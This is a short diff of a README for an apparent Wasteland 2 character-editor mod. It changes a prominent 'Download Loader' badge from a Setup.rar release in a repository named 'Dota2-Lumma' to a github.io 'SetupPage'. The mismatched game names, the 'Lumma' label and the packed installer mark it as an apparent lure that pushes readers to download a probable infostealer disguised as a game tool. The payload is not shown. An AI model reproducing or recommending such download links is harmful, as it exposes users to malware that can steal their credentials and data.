@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Wasteland 2 Character Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Wasteland-2-Character-Editor` · Updated: 2026-10-05
 
 **Tags:** `wasteland-2` `character-editor` `crpg` `post-apocalyptic` `turn-based`
+
 
 
 
